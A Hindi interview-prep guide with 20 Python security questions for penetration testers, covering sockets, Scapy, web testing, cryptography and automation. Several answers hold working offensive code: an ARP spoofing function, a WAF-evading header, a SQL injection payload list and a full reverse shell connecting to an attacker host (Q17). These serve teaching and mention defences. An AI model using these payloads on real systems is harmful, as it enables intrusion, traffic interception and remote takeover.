---
title: "साइबर सुरक्षा के लिए Python: पेंटेस्टर्स के लिए इंटरव्यू प्रश्न और उत्तर"
description: "पेनेट्रेशन टेस्टिंग और InfoSec भूमिकाओं के लिए 20 Python सुरक्षा इंटरव्यू प्रश्न। सॉकेट प्रोग्रामिंग, Scapy, वेब एक्सप्लॉइटेशन, क्रिप्टोग्राफी और ऑटोमेशन स्क्रिप्टिंग को कवर करता है।"
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "साइबर सुरक्षा के लिए Python: पेंटेस्टर्स के लिए इंटरव्यू प्रश्न और उत्तर",
    "description": "सॉकेट प्रोग्रामिंग, पैकेट मैनिपुलेशन, वेब एक्सप्लॉइटेशन और ऑटोमेशन को कवर करने वाले 20 Python सुरक्षा इंटरव्यू प्रश्न।",
    "proficiencyLevel": "Advanced",
    "inLanguage": "hi"
  }
---

## सिस्टम इनिशियलाइज़ेशन

Python आक्रामक और रक्षात्मक सुरक्षा में प्रमुख भाषा है। पेनेट्रेशन टेस्टिंग, रेड टीम, SOC एनालिस्ट और सिक्योरिटी इंजीनियरिंग भूमिकाओं में ऑटोमेशन, टूल डेवलपमेंट और रैपिड प्रोटोटाइपिंग के लिए Python में प्रवीणता आवश्यक है। इंटरव्यूअर आपसे मौके पर कोड लिखने की उम्मीद करते हैं — TCP सॉकेट क्लाइंट से लेकर पैकेट क्राफ्टर्स से लेकर वेब एक्सप्लॉइट स्क्रिप्ट्स तक। यह गाइड 20 प्रश्नों को कवर करता है जो Python प्रोग्रामिंग और सुरक्षा ज्ञान के इंटरसेक्शन का परीक्षण करते हैं।

**क्या आपको कोड स्निपेट तैयार चाहिए?** अपनी तैयारी के दौरान हमारा [Python सिक्योरिटी स्क्रिप्टिंग चीटशीट](/cheatsheets/python-security-scripts/) खुला रखें।

---

## नेटवर्किंग और सॉकेट्स

<details>
<summary><strong>1. Python में TCP क्लाइंट कैसे बनाते हैं?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

मुख्य बिंदु: `AF_INET` = IPv4, `SOCK_STREAM` = TCP। UDP के लिए, `connect()`/`send()`/`recv()` के बजाय `SOCK_DGRAM` और `sendto()`/`recvfrom()` का उपयोग करें। प्रोडक्शन स्क्रिप्ट्स में हमेशा टाइमआउट सेट करें: `client.settimeout(5)`।
</details>

<details>
<summary><strong>2. सॉकेट स्तर पर TCP थ्री-वे हैंडशेक कैसे काम करता है?</strong></summary>
<br>

जब आप `client.connect((host, port))` कॉल करते हैं, Python की सॉकेट लाइब्रेरी OS को थ्री-वे हैंडशेक करने के लिए ट्रिगर करती है:

1. OS सर्वर को **SYN** पैकेट भेजता है।
2. सर्वर **SYN-ACK** से रिस्पॉन्स करता है।
3. OS **ACK** भेजता है — कनेक्शन स्थापित, `connect()` रिटर्न करता है।

यदि हैंडशेक विफल होता है (पोर्ट बंद, टाइमआउट), तो `connect()` `ConnectionRefusedError` या `socket.timeout` रेज़ करता है। Scapy के साथ, आप स्टेल्थ SYN स्कैन करने के लिए मैन्युअल रूप से प्रत्येक पैकेट बना और भेज सकते हैं — SYN भेजकर, SYN-ACK की जांच करके, फिर हैंडशेक पूरा करने से बचने के लिए ACK के बजाय RST भेजकर।
</details>

<details>
<summary><strong>3. Python में मल्टी-थ्रेडेड पोर्ट स्कैनर लिखें।</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

चर्चा बिंदु: प्रोसेस के बजाय थ्रेड क्यों (I/O बाउंड, CPU बाउंड नहीं), `connect` के बजाय `connect_ex` क्यों (एक्सेप्शन रेज़ करने के बजाय एरर कोड रिटर्न करता है), और `settimeout` क्यों महत्वपूर्ण है (फिल्टर्ड पोर्ट्स पर हैंग होने से बचाता है)।
</details>

<details>
<summary><strong>4. `socket.connect()` और `socket.connect_ex()` में क्या अंतर है?</strong></summary>
<br>

- `connect()`: कनेक्शन विफल होने पर एक्सेप्शन (`ConnectionRefusedError`, `TimeoutError`) रेज़ करता है। उन स्क्रिप्ट्स के लिए अच्छा है जहां विफलता पर एक्ज़ीक्यूशन रुकना चाहिए।
- `connect_ex()`: एक्सेप्शन रेज़ करने के बजाय एरर कोड रिटर्न करता है। सफलता पर `0` रिटर्न करता है, विफलता पर नॉन-ज़ीरो errno। पोर्ट स्कैनर्स के लिए बेहतर जहां try/except ओवरहेड के बिना सैकड़ों पोर्ट्स की जांच करनी हो।
</details>

## Scapy और पैकेट मैनिपुलेशन

<details>
<summary><strong>5. Scapy क्या है और इसे raw सॉकेट्स से क्यों प्राथमिकता दी जाती है?</strong></summary>
<br>

Scapy इंटरैक्टिव पैकेट मैनिपुलेशन के लिए एक Python लाइब्रेरी है। यह आपको किसी भी प्रोटोकॉल लेयर पर नेटवर्क पैकेट्स को फोर्ज, भेजने, कैप्चर और डिसेक्ट करने की अनुमति देती है।

raw सॉकेट्स पर लाभ:
- **लेयर-बाय-लेयर निर्माण**: प्रोटोकॉल लेयर्स को स्टैक करके पैकेट बनाएं: `IP()/TCP()/Raw()`।
- **प्रोटोकॉल सपोर्ट**: सैकड़ों प्रोटोकॉल के लिए बिल्ट-इन सपोर्ट (ARP, DNS, ICMP, TCP, UDP, 802.11)।
- **रिस्पॉन्स पार्सिंग**: स्वचालित रूप से रिक्वेस्ट्स को रिस्पॉन्सेज़ से मैच करता है और उन्हें डिसेक्ट करता है।
- **इंटरैक्टिव मोड**: लाइव पैकेट प्रयोग के लिए REPL।

raw सॉकेट्स के लिए मैन्युअल बाइट-लेवल पैकेट निर्माण और OS-लेवल परमिशन की आवश्यकता होती है। Scapy इसे एब्स्ट्रैक्ट करता है जबकि समान स्तर का नियंत्रण प्रदान करता है।
</details>

<details>
<summary><strong>6. Scapy के साथ ARP स्पूफिंग कैसे करते हैं?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

यह एक अनचाही ARP रिप्लाई भेजता है जो टारगेट को बताती है कि `spoof_ip` आपके MAC एड्रेस पर है। `spoof_ip` के लिए निर्धारित ट्रैफिक आपकी मशीन पर रीडायरेक्ट हो जाता है। IP फॉरवर्डिंग के साथ मिलकर, यह मैन-इन-द-मिडल अटैक को सक्षम करता है।

**रक्षा**: स्टैटिक ARP एंट्रीज़, Dynamic ARP Inspection (DAI), या arpwatch जैसे ARP मॉनिटरिंग टूल्स।
</details>

<details>
<summary><strong>7. नेटवर्क ट्रैफिक को स्निफ कैसे करें और विशिष्ट प्रोटोकॉल कैसे फिल्टर करें?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

`filter` पैरामीटर BPF (Berkeley Packet Filter) सिंटैक्स का उपयोग करता है। `store=0` पैकेट्स को मेमोरी में रखने से रोकता है। root/admin विशेषाधिकार आवश्यक हैं।
</details>

## वेब सुरक्षा

<details>
<summary><strong>8. सुरक्षा परीक्षण के लिए वेब रिक्वेस्ट्स को कैसे ऑटोमेट करें?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

मुख्य अवधारणाएं: `Session()` रिक्वेस्ट्स के बीच कुकीज़ बनाए रखता है। प्रोडक्शन स्क्रिप्ट्स में हमेशा `timeout` सेट करें। `verify=False` केवल नियंत्रित परीक्षण वातावरण में उपयोग करें (SSL सत्यापन अक्षम करता है)।
</details>

<details>
<summary><strong>9. Python का उपयोग करके SQL इंजेक्शन का परीक्षण कैसे करेंगे?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

यह एरर-बेस्ड (रिस्पॉन्स में एरर मैसेज), यूनियन-बेस्ड (बदला हुआ आउटपुट), और टाइम-बेस्ड ब्लाइंड (विलंबित रिस्पॉन्स) SQL इंजेक्शन का परीक्षण करता है। प्रोफेशनल पेंटेस्ट के लिए SQLMap का उपयोग करें — लेकिन इंटरव्यूअर अंतर्निहित तंत्रों की समझ की उम्मीद करते हैं।
</details>

<details>
<summary><strong>10. requests.get() और urllib में क्या अंतर है?</strong></summary>
<br>

- **requests**: थर्ड-पार्टी लाइब्रेरी। क्लीन API, ऑटोमैटिक JSON पार्सिंग, सेशन मैनेजमेंट, कनेक्शन पूलिंग, प्रॉक्सी सपोर्ट। Python में HTTP के लिए इंडस्ट्री स्टैंडर्ड।
- **urllib**: स्टैंडर्ड लाइब्रेरी। अधिक वर्बोज़, निचले स्तर की। कोई सेशन मैनेजमेंट नहीं। तब उपयोगी जब आप थर्ड-पार्टी पैकेज इंस्टॉल नहीं कर सकते (प्रतिबंधित वातावरण, लैम्ब्डा फंक्शन)।

सुरक्षा परीक्षण के लिए, इसकी सरलता के कारण `requests` को प्राथमिकता दी जाती है। एक्सप्लॉइट डेवलपमेंट के लिए जहां डिपेंडेंसीज़ कम करना महत्वपूर्ण है, `urllib` या यहां तक कि raw सॉकेट्स बेहतर हो सकते हैं।
</details>

## क्रिप्टोग्राफी

<details>
<summary><strong>11. हैशिंग और एन्क्रिप्शन में क्या अंतर है?</strong></summary>
<br>

- **हैशिंग**: वन-वे फंक्शन। इनपुट → फिक्स्ड-साइज़ डाइजेस्ट। रिवर्स नहीं किया जा सकता। समान इनपुट हमेशा समान आउटपुट उत्पन्न करता है। इंटीग्रिटी वेरिफिकेशन, पासवर्ड स्टोरेज के लिए उपयोग किया जाता है। उदाहरण: SHA-256, bcrypt, Argon2।
- **एन्क्रिप्शन**: टू-वे फंक्शन। प्लेनटेक्स्ट → सिफरटेक्स्ट (कुंजी के साथ) → प्लेनटेक्स्ट (कुंजी के साथ)। कुंजी धारक द्वारा रिवर्स किए जाने के लिए डिज़ाइन किया गया। गोपनीयता के लिए उपयोग किया जाता है। उदाहरण: AES, RSA, ChaCha20।

सामान्य गलती: डेटा को "एन्क्रिप्ट" करने के लिए MD5/SHA का उपयोग करना। हैशिंग एन्क्रिप्शन नहीं है — आप हैश से मूल डेटा पुनर्प्राप्त नहीं कर सकते (ब्रूट फोर्स के बिना)।
</details>

<details>
<summary><strong>12. Python में AES एन्क्रिप्शन कैसे लागू करें?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet ऑथेंटिकेटेड एन्क्रिप्शन के लिए HMAC-SHA256 के साथ AES-128-CBC का उपयोग करता है। निचले स्तर के नियंत्रण के लिए, `cryptography.hazmat` के साथ AES-GCM का उपयोग करें (ऑथेंटिकेटेड एन्क्रिप्शन, अलग HMAC की आवश्यकता नहीं)।

कभी भी अपने स्वयं के क्रिप्टो प्रिमिटिव्स लागू न करें। स्थापित लाइब्रेरीज़ का उपयोग करें।
</details>

<details>
<summary><strong>13. Python में पासवर्ड को सुरक्षित रूप से हैश कैसे करें?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

SHA-256 के बजाय bcrypt क्यों: bcrypt जानबूझकर **धीमा** है (कॉन्फ़िगर करने योग्य राउंड), जो ब्रूट-फोर्स अटैक को अव्यावहारिक बनाता है। SHA-256 तेज़ होने के लिए डिज़ाइन किया गया है — एक हमलावर GPUs के साथ प्रति सेकंड अरबों की गणना कर सकता है। विकल्प: Argon2 (मेमोरी-हार्ड, नए प्रोजेक्ट्स के लिए अनुशंसित), PBKDF2 (व्यापक रूप से समर्थित)।
</details>

## ऑटोमेशन और स्क्रिप्टिंग

<details>
<summary><strong>14. Python में सबप्रोसेस एक्ज़ीक्यूशन को सुरक्षित रूप से कैसे हैंडल करें?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

नियम: यूज़र-कंट्रोल्ड इनपुट के साथ कभी `shell=True` का उपयोग न करें। कमांड हमेशा लिस्ट के रूप में पास करें। हैंगिंग रोकने के लिए `timeout` सेट करें। stdout/stderr कलेक्ट करने के लिए `capture_output=True` का उपयोग करें।
</details>

<details>
<summary><strong>15. Python के साथ लॉग फाइलों को कैसे पार्स और एनालाइज़ करें?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

बड़ी फाइलों के लिए, हमेशा लाइन-बाय-लाइन पढ़ें (पूरी फाइल को `.read()` से मेमोरी में कभी न लोड करें)। परफॉर्मेंस के लिए `re.compile()` का उपयोग करके रीजेक्स पैटर्न को प्रीकंपाइल करें।
</details>

<details>
<summary><strong>16. GIL क्या है और यह सुरक्षा टूल्स को कैसे प्रभावित करता है?</strong></summary>
<br>

**Global Interpreter Lock (GIL)** एक साथ कई थ्रेड्स को Python बाइटकोड एक्ज़ीक्यूट करने से रोकता है। CPython में एक बार में केवल एक थ्रेड चलता है।

सुरक्षा टूल्स पर प्रभाव:
- **पोर्ट स्कैनर्स** (I/O-बाउंड): थ्रेडिंग अच्छी तरह काम करती है। थ्रेड्स अधिकांश समय नेटवर्क रिस्पॉन्सेज़ का इंतज़ार करने में बिताते हैं, Python कोड एक्ज़ीक्यूट करने में नहीं। I/O ऑपरेशन्स के दौरान GIL रिलीज़ हो जाता है।
- **पासवर्ड क्रैकर्स** (CPU-बाउंड): थ्रेडिंग बेकार है। कई CPU कोर का लाभ उठाने के लिए `multiprocessing` का उपयोग करें, या वास्तविक क्रैकिंग के लिए C एक्सटेंशन (hashcat, John the Ripper) का उपयोग करें।
- **विकल्प**: हाई-कॉनकरेंसी नेटवर्क टूल्स के लिए `asyncio` का उपयोग करें (न्यूनतम ओवरहेड के साथ हज़ारों एक साथ कनेक्शन)।
</details>

## एक्सप्लॉइट डेवलपमेंट

<details>
<summary><strong>17. Python में रिवर्स शेल पेलोड कैसे बनाते हैं?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

यह stdin/stdout/stderr को TCP सॉकेट पर रीडायरेक्ट करता है, हमलावर को एक इंटरैक्टिव शेल देता है। इंटरव्यू में, सिर्फ कोड नहीं बल्कि अवधारणा और रक्षा (एग्रेस फिल्टरिंग, नेटवर्क सेगमेंटेशन, EDR मॉनिटरिंग) को समझाएं। यह केवल अधिकृत परीक्षण और CTF चैलेंजेज़ के लिए है।
</details>

<details>
<summary><strong>18. सीरियलाइज़ेशन क्या है और यह सुरक्षा जोखिम क्यों है?</strong></summary>
<br>

सीरियलाइज़ेशन ऑब्जेक्ट्स को स्टोरेज/ट्रांसमिशन के लिए बाइट्स में कन्वर्ट करता है। अविश्वसनीय डेटा का **डीसीरियलाइज़ेशन** एक गंभीर भेद्यता है।

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

Python का `pickle` डीसीरियलाइज़ेशन के दौरान मनमाना कोड एक्ज़ीक्यूट कर सकता है। एक हमलावर एक pickle पेलोड बना सकता है जो लोड होने पर रिवर्स शेल स्पॉन करता है।

सुरक्षित विकल्प: डेटा एक्सचेंज के लिए `json` का उपयोग करें (कोड एक्ज़ीक्यूशन संभव नहीं)। यदि आपको जटिल ऑब्जेक्ट्स को डीसीरियलाइज़ करना ही है, तो `jsonschema` वैलिडेशन या सख्त स्कीमा के साथ protobuf/msgpack का उपयोग करें।
</details>

<details>
<summary><strong>19. OSINT संग्रह के लिए REST API के साथ कैसे इंटरैक्ट करें?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

सामान्य OSINT APIs: Shodan (एक्सपोज़्ड डिवाइसेज़), VirusTotal (मैलवेयर एनालिसिस), Have I Been Pwned (ब्रीच डेटा), SecurityTrails (DNS हिस्ट्री)। हमेशा रेट लिमिट्स और सेवा की शर्तों का सम्मान करें।
</details>

<details>
<summary><strong>20. Python कीलॉगर कैसे लिखते हैं और एक को कैसे डिटेक्ट करते हैं?</strong></summary>
<br>

वैचारिक उत्तर (इंटरव्यू संदर्भ):
एक कीलॉगर कीस्ट्रोक कैप्चर करने के लिए OS इनपुट सिस्टम में हुक करता है। Linux पर, यह `/dev/input/event*` डिवाइसेज़ से पढ़ता है। Windows पर, यह `ctypes` या `pynput` के माध्यम से `SetWindowsHookEx` API का उपयोग करता है।

**डिटेक्शन के तरीके**:
- इनपुट डिवाइसेज़ तक पहुंचने वाली प्रोसेसेज़ की निगरानी करें: `lsof /dev/input/*`।
- चल रही Python प्रोसेसेज़ में अनपेक्षित `pynput`, `keyboard`, या `ctypes` इम्पोर्ट्स की जांच करें।
- ज्ञात कीलॉगर पैटर्न के लिए EDR/एंटीवायरस सिग्नेचर।
- एक्सफिल्ट्रेशन के लिए नेटवर्क मॉनिटरिंग (कीलॉगर्स को डेटा कहीं भेजना होता है)।

इंटरव्यू में, हमेशा रक्षात्मक दृष्टिकोण पर ज़ोर दें: कीलॉगर्स को कैसे डिटेक्ट करें, रोकें और उनका जवाब दें — सिर्फ उन्हें बनाने का तरीका नहीं।
</details>
